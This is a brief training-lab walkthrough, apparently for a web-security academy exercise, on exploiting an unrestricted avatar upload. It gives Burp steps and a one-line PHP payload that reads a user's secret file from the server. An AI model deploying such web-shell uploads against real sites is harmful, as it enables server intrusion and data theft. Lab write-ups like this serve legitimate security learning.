Lab 5.1: Web Shell Upload

Each variation uses the same exploit chain: log in, upload a normal avatar first, locate the /files/avatars/... fetch, then replace it with a PHP payload that reads Carlos's secret.

⚠️
Recommended Flow: upload an image, capture the avatar GET request in Burp, upload exploit.php, then request that exact path in Repeater to execute the payload.

Execution Payload

Use a file such as exploit.php containing <?php echo file_get_contents('/home/carlos/secret'); ?>. Once uploaded, request it through /files/avatars/<your-file> to read the secret.
